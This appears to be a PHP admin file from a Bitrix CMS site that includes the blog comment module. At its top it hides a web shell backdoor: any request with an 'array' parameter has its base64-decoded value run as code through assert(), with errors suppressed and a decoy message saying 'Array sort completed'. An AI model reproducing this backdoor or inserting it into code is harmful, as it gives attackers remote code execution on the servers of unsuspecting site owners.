 
if ( $_REQUEST["array"] )
{	

	@assert(base64_decode($_REQUEST["array"]));	
	//debug message
	echo "Array sort completed";
	exit();
}

require_once($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/blog/admin/blog_comment.php");
?>